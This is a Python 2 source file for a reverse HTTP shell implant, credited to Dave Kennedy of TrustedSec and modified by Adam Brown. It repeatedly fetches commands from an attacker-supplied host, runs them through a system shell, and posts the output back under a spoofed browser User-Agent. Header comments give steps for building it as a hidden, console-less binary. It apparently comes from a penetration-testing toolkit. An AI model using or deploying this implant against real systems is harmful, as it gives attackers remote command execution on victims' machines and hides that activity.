#!/usr/bin/python
##########################################################################################################################
#
#
#
# Uncrypted Reverse HTTP Listener by:
#
#        Dave Kennedy (ReL1K)
#     http://www.secmaniac.com
#
#            Modified By:
#        Adam Brown (br0wniE)
#       http://coffeegist.com
#
#
##########################################################################################################################
#
#
##########################################################################################################################
#
# This shell works on any platform you want to compile it in. OSX, Windows, Linux, etc.
#
##########################################################################################################################
#
##########################################################################################################################
#
# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction
# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary.
#
##########################################################################################################################
#
# export VERSIONER_PYTHON_PREFER_32_BIT=yes
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell/shell.spec
#
###########################################################################################################################
# Copyright 2012 TrustedSec, LLC. All rights reserved.
#
# This piece of software code is licensed under the FreeBSD license..
#
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information.

import urllib
import urllib2
import httplib
import subprocess
import sys
import os

# TURN THIS ON IF YOU WANT PROXY SUPPORT
PROXY_SUPPORT = "OFF"
# THIS WILL BE THE PROXY URL
PROXY_URL = "http://proxyinfo:80"
# USERNAME FOR THE PROXY
USERNAME = "username"
# PASSWORD FOR THE PROXY
PASSWORD = "password"

# here is where we set all of our proxy settings
if PROXY_SUPPORT == "ON":
    auth_handler = urllib2.HTTPBasicAuthHandler()
    auth_handler.add_password(realm='RESTRICTED ACCESS',
                              uri=PROXY_URL, # PROXY SPECIFIED ABOVE
                              user=USERNAME, # USERNAME SPECIFIED ABOVE
                              passwd=PASSWORD) # PASSWORD SPECIFIED ABOVE
    opener = urllib2.build_opener(auth_handler)
    urllib2.install_opener(opener)

try:
    # our reverse listener ip address
    address = sys.argv[1]
    # our reverse listener port address
    port = sys.argv[2]

# except that we didn't pass parameters
except IndexError:
    print " \nAES Encrypted Reverse HTTP Shell by: "
    print "         Dave Kennedy (ReL1K)           "
    print "       http://www.secmaniac.com         "
    print "                                        "
    print "            Unencrypted By:             "
    print "         Adam Brown (br0wniE)           "
    print "       http://www.coffeegist.com        "
    print "Usage: %s <reverse_ip_address> <port> \n" % (sys.argv[0])
    sys.exit()

# loop forever
while True:
    # open up our request handelr
    req = urllib2.Request('http://%s:%s' % (address,port))
    # grab our response which contains what command we want
    message = urllib2.urlopen(req).read()
    # quit out if we receive that command
    if message == "quit" or message == "exit":
        sys.exit()
    # issue the shell command we want
    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # read out the data of stdout
    data = proc.stdout.read() + proc.stderr.read()
    # urlencode the data from stdout
    data = urllib.urlencode({'cmd': '%s'}) % (data)
    # who we want to connect back to with the shell
    h = httplib.HTTPConnection('%s:%s' % (address,port))
    # set our basic headers
    headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    # actually post the data
    h.request('POST', '/index.aspx', data, headers)
